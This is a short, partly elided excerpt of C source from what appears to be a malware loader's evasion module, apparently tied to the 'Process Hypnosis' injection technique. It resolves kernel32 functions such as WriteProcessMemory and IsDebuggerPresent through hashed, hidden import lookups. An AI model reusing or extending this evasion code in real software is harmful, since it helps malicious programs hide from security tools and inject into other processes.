#include "Evasion.h"
#include "LLVM-ProcessHypnosisEvasion.h"
...
int InitEvasion() {
	...
	pVirtualAllocExNuma = (fnVirtualAllocExNuma)NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALALLOCEXNUMA);
	pFlsAlloc = (fnFlsAlloc)NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_FLSALLOC);
	pIsDebuggerPresent = (fnIsDebuggerPresent)NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_ISDEBUGGERPRESENT);
	pWriteProcessMemory = (fnWriteProcessMemory)NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_WRITEPROCESSMEMORY);
